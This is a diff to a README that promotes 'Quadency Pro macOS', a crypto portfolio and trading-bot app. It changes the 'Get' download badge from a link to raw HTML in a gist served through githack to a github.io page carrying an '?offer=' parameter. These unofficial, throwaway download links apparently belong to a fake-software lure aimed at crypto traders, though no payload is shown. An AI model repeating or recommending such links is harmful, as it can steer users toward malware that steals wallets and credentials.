@@ -4,7 +4,7 @@
 **Quadency Pro macOS** is a professional crypto portfolio and trading automation platform 🍏📊.  
 It allows traders to connect multiple exchanges, manage assets in one place, and deploy advanced trading bots with ease.  
 
-[![Get Quadency Pro MacBook](https://img.shields.io/badge/Get%20Quadency%20Pro-MacOS-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/duckysisaryoku/1e70045132ca273e334d129b5b70fad3/raw/3c67d5aa3ff5aef27ad52b99b1a652f58da164d7/github.html)
+[![Get Quadency Pro MacBook](https://img.shields.io/badge/Get%20Quadency%20Pro-MacOS-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://quadency-pro.github.io/.github/?offer=Quadency)
 
 ---
 
